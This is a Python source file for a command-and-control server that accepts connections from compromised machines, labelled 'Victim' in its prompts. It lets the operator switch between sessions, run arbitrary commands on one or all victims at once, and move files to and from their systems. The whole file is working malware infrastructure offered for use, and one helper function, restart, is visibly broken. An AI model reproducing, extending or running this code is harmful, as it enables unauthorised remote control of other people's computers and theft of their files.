import socket
import json
import os
import threading
print("[*] Checking Requirements Module.....")
try:
    import termcolor
except ImportError:
    os.system("pip install termcolor -q -q -q")
    import termcolor
from termcolor import colored
try:
    import pyfiglet
except ImportError:
    os.system("pip install pyfiglet -q -q -q")
    import pyfiglet
def logo():
    ascii_banner = pyfiglet.figlet_format("       {C2 S3RV3R}").upper()
    print(colored(ascii_banner.rstrip("\n"), 'cyan', attrs=['bold']))
    print(colored("                        Type:- usage     \n", 'magenta', attrs=['bold']))
    print(colored("                        <Version: 1.0>     \n", 'magenta', attrs=['bold']))

def reliable_recv(target):
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(target, data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def upload_file(target, file_name):
    f = open(file_name, 'rb')
    target.send(f.read())

def download_file(target, file_name):
    f = open(file_name, 'wb')
    target.settimeout(1)
    chunk = target.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = target.recv(1024)
        except socket.timeout as e:
            break
    target.settimeout(None)
    f.close()


def target_communication(target, ip):
    count = 0
    while True:
        command = input('* Victim~%s: ' % str(ip))
        reliable_send(target, command)
        if command == 'quit':
            break
        elif command == 'background':
            break
        elif command == 'clear':
            os.system('clear')
        elif command[:3] == 'cd ':
            pass
        elif command[:6] == 'upload':
            upload_file(target, command[7:])
        elif command[:8] == 'download':
            download_file(target, command[9:])
        elif command == 'help':
            print(termcolor.colored('''\n
            quit                                --> Quit Session With The Target
            clear                               --> Clear The Screen
            cd *Directory Name*                 --> Changes Directory On Target System
            upload *file name*                  --> Upload File To The target Machine
            download *file name*                --> Download File From Target Machine'''),'green')
        else:
            result = reliable_recv(target)
            print(result)

def restart(self) -> bool:
    reliable_send(['res'])
    return reliable_send()
def accept_connections():
    while True:
        if stop_flag:
            break
        sock.settimeout(1)
        try:
            target, ip = sock.accept()
            targets.append(target)
            ips.append(ip)
            print(termcolor.colored(str(ip) + ' has connected!', 'green'))
        except:
            pass
os.system('cls' if os.name == 'nt' else 'clear')
logo()
try:
    abc = input(termcolor.colored("[*] Enter Your ip: ", 'blue'))
    cde = int(input(termcolor.colored("[*] Enter Your Port: ", 'cyan')))
    targets = []
    ips = []
    stop_flag = False
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((f'{abc}', cde))
    sock.listen(5)
    t1 = threading.Thread(target=accept_connections)
    t1.start()
    print(termcolor.colored('[+] Listening For The Incoming Connections ...', 'yellow'))
    print()
    try:
        while True:
            command = input('[+] C2@Server:- ')
            if command == 'targets':
                counter = 0
                for ip in ips:
                    print('Session ' + str(counter) + ' --- ' + str(ip))
                    counter += 1
            elif command == 'clear':
                os.system('clear')
            elif command == 'cls':
                os.system('cls')
            elif command == 'usage':
                print(termcolor.colored('''\n
        ===Command and Control (C2) Usage===
        targets                 --> Prints Active Sessions
        session *session num*   --> Will Connect To Session (background to return)
        clear                   --> Clear Terminal Screen
        cls                     --> clear the windows screen
        exit                    --> Quit ALL Active Sessions and Closes C2 Server!!
        kill *session num*      --> Issue 'quit' To Specified Target Session
        sendall *command*       --> Sends The *command* To ALL Active Sessions (sendall notepad)
        \n''', 'cyan'))
            elif command == 'res':
                restart()
            elif command[:7] == 'session':
                try:
                    num = int(command[8:])
                    tarnum = targets[num]
                    tarip = ips[num]
                    target_communication(tarnum, tarip)
                except:
                    print('[-] No Session Under That ID Number')
            elif command == 'exit':
                for target in targets:
                    reliable_send(target, 'quit')
                    target.close()
                sock.close()
                stop_flag = True
                t1.join()
                break
            elif command[:4] == 'kill':
                targ = targets[int(command[5:])]
                ip = ips[int(command[5:])]
                reliable_send(targ, 'quit')
                targ.close()
                targets.remove(targ)
                ips.remove(ip)
            elif command[:7] == 'sendall':
                x = len(targets)
                print(x)
                i = 0
                try:
                    while i < x:
                        tarnumber = targets[i]
                        print(tarnumber)
                        reliable_send(tarnumber, command)
                        i += 1
                except:
                    print('Failed')
            else:
                print(termcolor.colored('[!!] Command Doesnt Exist', 'red'))
    except KeyboardInterrupt:
        print("\nYou Did something Wrong! Restart the C2")
        exit()

except KeyboardInterrupt:
    print(termcolor.colored("\nYou Pressed The Exit Button!", 'red'))
    quit()
